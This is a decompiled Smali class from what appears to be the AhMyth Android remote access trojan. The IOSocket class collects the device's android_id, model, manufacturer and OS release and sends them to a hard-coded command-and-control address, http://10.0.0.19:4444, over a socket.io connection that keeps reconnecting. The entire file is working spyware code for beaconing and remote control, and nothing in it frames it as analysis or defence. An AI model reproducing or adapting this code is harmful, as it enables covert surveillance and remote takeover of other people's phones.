.class public Lahmyth/mine/king/ahmyth/IOSocket;
.super Ljava/lang/Object;
.source "IOSocket.java"


# static fields
.field private static ourInstance:Lahmyth/mine/king/ahmyth/IOSocket;


# instance fields
.field private ioSocket:Lio/socket/client/Socket;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .line 14
    new-instance v0, Lahmyth/mine/king/ahmyth/IOSocket;

    invoke-direct {v0}, Lahmyth/mine/king/ahmyth/IOSocket;-><init>()V

    sput-object v0, Lahmyth/mine/king/ahmyth/IOSocket;->ourInstance:Lahmyth/mine/king/ahmyth/IOSocket;

    return-void
.end method

.method private constructor <init>()V
    .locals 4

    .line 19
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 22
    :try_start_0
    invoke-static {}, Lahmyth/mine/king/ahmyth/MainService;->getContextOfApplication()Landroid/content/Context;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v1, "android_id"

    invoke-static {v0, v1}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 23
    new-instance v1, Lio/socket/client/IO$Options;

    invoke-direct {v1}, Lio/socket/client/IO$Options;-><init>()V

    const/4 v2, 0x1

    .line 24
    iput-boolean v2, v1, Lio/socket/client/IO$Options;->reconnection:Z

    const-wide/16 v2, 0x1388

    .line 25
    iput-wide v2, v1, Lio/socket/client/IO$Options;->reconnectionDelay:J

    const-wide/32 v2, 0x3b9ac9ff

    .line 26
    iput-wide v2, v1, Lio/socket/client/IO$Options;->reconnectionDelayMax:J

    .line 28
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "http://10.0.0.19:4444?model="

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    sget-object v2, Landroid/os/Build;->MODEL:Ljava/lang/String;

    invoke-static {v2}, Landroid/net/Uri;->encode(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "&manf="

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    sget-object v2, Landroid/os/Build;->MANUFACTURER:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "&release="

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    sget-object v2, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "&id="

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lio/socket/client/IO;->socket(Ljava/lang/String;)Lio/socket/client/Socket;

    move-result-object v0

    iput-object v0, p0, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;
    :try_end_0
    .catch Ljava/net/URISyntaxException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    .line 30
    invoke-virtual {v0}, Ljava/net/URISyntaxException;->printStackTrace()V

    :goto_0
    return-void
.end method

.method public static getInstance()Lahmyth/mine/king/ahmyth/IOSocket;
    .locals 1

    .line 36
    sget-object v0, Lahmyth/mine/king/ahmyth/IOSocket;->ourInstance:Lahmyth/mine/king/ahmyth/IOSocket;

    return-object v0
.end method


# virtual methods
.method public getIoSocket()Lio/socket/client/Socket;
    .locals 1

    .line 40
    iget-object v0, p0, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    return-object v0
.end method
